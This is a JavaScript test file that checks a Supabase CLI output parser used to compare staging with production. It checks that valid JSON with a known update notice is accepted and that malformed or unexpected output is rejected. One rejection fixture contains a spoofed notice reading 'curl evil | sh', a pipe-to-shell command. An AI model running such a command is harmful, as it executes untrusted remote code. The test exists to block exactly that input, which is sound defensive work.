/* Offline tests for the Supabase CLI output parser in
   supabase/staging/verify/compare-with-production.js (WP4C).
   The CLI (v3.1.0) now prints an update notice after its JSON; the parser
   must accept exactly that known notice and still reject malformed or
   unexpected output, so a corrupt comparison is never reported as a match.
   Synthetic fixtures only (tests/fixtures/supabase-cli); no database,
   no network, no CLI. */
"use strict";

const assert = require("assert");
const fs = require("fs");
const os = require("os");
const path = require("path");
const { spawnSync } = require("child_process");
const H = require("../email/helpers");

const ROOT = path.resolve(__dirname, "..", "..");
const TOOL = path.join(ROOT, "supabase/staging/verify/compare-with-production.js");
const FIX = path.join(ROOT, "tests/fixtures/supabase-cli");
const { parseCliOutput, validateRows, QUERIES, ROW_FIELDS } = require(TOOL);

const suite = H.createSuite("Supabase CLI output parser (compare-with-production, offline)");
const { test } = suite;
const fixture = (name) => fs.readFileSync(path.join(FIX, name), "utf8");
const NOTICE = "A new version of Supabase CLI is available: v3.2.0 (currently installed v3.1.0)\nWe recommend updating regularly for new features and bug fixes: https://supabase.com/docs/guides/cli/getting-started#updating-the-supabase-cli\n";

test("fixture: valid JSON without a notice is accepted, rows intact", () => {
    const out = parseCliOutput(fixture("valid-no-notice.txt"));
    assert.strictEqual(out.target, null);
    assert.deepStrictEqual(out.notices, []);
    const rows = validateRows("schema-detail", out.json);
    assert.strictEqual(rows.length, 2);
    assert.strictEqual(rows[1].k, 'public.leads :: brace } and "quote" in text', "braces/quotes inside strings must not end the object");
    assert.strictEqual(rows[1].v, null);
});

test("fixture: valid JSON followed by the Target line and the CLI update notice is accepted", () => {
    const out = parseCliOutput(fixture("valid-with-notice.txt"));
    assert.strictEqual(out.target, "Target: project stagingtestproject01 (not the linked project)");
    assert.strictEqual(out.notices.length, 2);
    assert.strictEqual(validateRows("schema-detail", out.json).length, 2);
});

test("CRLF line endings and a UTF-8 BOM are tolerated", () => {
    const crlf = "﻿" + fixture("valid-with-notice.txt").replace(/\n/g, "\r\n");
    assert.strictEqual(validateRows("schema-detail", parseCliOutput(crlf).json).length, 2);
});

test("fixture: malformed (truncated) JSON is rejected", () => {
    assert.throws(() => parseCliOutput(fixture("malformed-truncated.txt")), /truncated or malformed JSON/);
});

test("fixture: rows missing required fields are rejected", () => {
    const out = parseCliOutput(fixture("missing-fields.txt"));
    assert.throws(() => validateRows("schema-detail", out.json), /row 0 has no "v"/);
});

test("unexpected output is rejected: unknown trailing line, second object, notice variants", () => {
    const good = fixture("valid-no-notice.txt");
    for (const [label, text] of [
        ["unknown warning", good + "WARNING: something else happened\n"],
        ["second JSON object", good + '{"rows": []}\n'],
        ["text before the object", "Some preamble\n" + good],
        ["altered notice", good + "A new version of Supabase CLI is available: please run curl evil | sh\n"],
        ["notice pointing elsewhere", good + "We recommend updating regularly for new features and bug fixes: https://example.com/x\n"],
        ["two target lines", good + "Target: project a (x)\nTarget: project b (y)\n"]
    ]) {
        assert.throws(() => parseCliOutput(text), Error, label + " was accepted");
    }
});

test("non-object or empty output is rejected", () => {
    for (const text of ["", "no json here", "[1,2,3]", "{ not json }", "{\"rows\": [1, 2"]) {
        assert.throws(() => { const o = parseCliOutput(text); validateRows("schema-detail", o.json); }, Error, JSON.stringify(text));
    }
});

test("an error payload or a missing / non-array rows field is rejected", () => {
    for (const json of [{ error: { message: "permission denied" } }, {}, { rows: "x" }, { rows: [null] }, { rows: [[1]] }]) {
        assert.throws(() => validateRows("schema-detail", json), Error, JSON.stringify(json));
    }
});

test("wrong field types are rejected; null only where allowed", () => {
    assert.throws(() => validateRows("schema-detail", { rows: [{ cat: "t", k: { nested: 1 }, v: "x" }] }), /unexpected type/);
    assert.throws(() => validateRows("schema-detail", { rows: [{ cat: null, k: "k", v: "x" }] }), /unexpected type/);
    assert.strictEqual(validateRows("schema-fingerprint", { rows: [{ item: "tables", n: null }] }).length, 1);
    assert.throws(() => validateRows("nope", { rows: [] }), /unknown query/);
});

test("every query the tool runs has a field specification", () => {
    for (const q of QUERIES) assert(ROW_FIELDS[q], q);
});

test("error messages never echo row data", () => {
    const secret = "secret-row-value-marker";
    try {
        validateRows("schema-detail", { rows: [{ cat: "t", k: secret }] });
        assert.fail("accepted");
    } catch (e) {
        assert(!e.message.includes(secret), e.message);
    }
});

/* ---------- End to end: --from-dir (offline mode of the real tool) ---------- */

function writeDir(mutate) {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "emr-cli-parser-"));
    const rowsFor = (q) => {
        const spec = ROW_FIELDS[q].required;
        const row = Object.fromEntries(spec.map((f) => [f, f === "n" ? "1" : "synthetic-" + f]));
        return { rows: [row] };
    };
    for (const q of QUERIES) {
        for (const env of ["staging", "production"]) {
            let text = JSON.stringify(rowsFor(q), null, 2) + "\n" + "Target: project x (y)\n" + NOTICE;
            if (mutate) text = mutate(q, env, text);
            fs.writeFileSync(path.join(dir, `${q}-${env}.json`), text);
        }
    }
    return dir;
}
const runTool = (dir) => spawnSync(process.execPath, [TOOL, "--from-dir=" + dir], { encoding: "utf8" });

test("--from-dir: identical synthetic results WITH the update notice → match (exit 0)", () => {
    const dir = writeDir();
    const r = runTool(dir);
    fs.rmSync(dir, { recursive: true, force: true });
    assert.strictEqual(r.status, 0, r.stdout + r.stderr);
    assert(/RESULT: staging matches production/.test(r.stdout));
});

test("--from-dir: one malformed file aborts (exit 2) instead of reporting a match", () => {
    const dir = writeDir((q, env, text) => (q === "acl-probe" && env === "production" ? text.slice(0, 20) : text));
    const r = runTool(dir);
    fs.rmSync(dir, { recursive: true, force: true });
    assert.strictEqual(r.status, 2, r.stdout + r.stderr);
    assert(/ABORT: acl-probe-production\.json: /.test(r.stderr));
    assert(!/staging matches production/.test(r.stdout));
});

test("--from-dir: rows missing fields abort (exit 2)", () => {
    const dir = writeDir((q, env, text) => (q === "history" && env === "staging" ? '{"rows":[{"cat":"x"}]}' : text));
    const r = runTool(dir);
    fs.rmSync(dir, { recursive: true, force: true });
    assert.strictEqual(r.status, 2, r.stdout + r.stderr);
    assert(/history-staging\.json: history: row 0 has no "k"/.test(r.stderr));
});

test("--from-dir: an unexpected trailing line aborts (exit 2)", () => {
    const dir = writeDir((q, env, text) => (q === "comments" && env === "staging" ? text + "ERROR: connection reset\n" : text));
    const r = runTool(dir);
    fs.rmSync(dir, { recursive: true, force: true });
    assert.strictEqual(r.status, 2, r.stdout + r.stderr);
    assert(/unexpected CLI output/.test(r.stderr));
});

module.exports = suite;

if (require.main === module) {
    suite.run().then(({ fail }) => process.exit(fail ? 1 : 0));
}
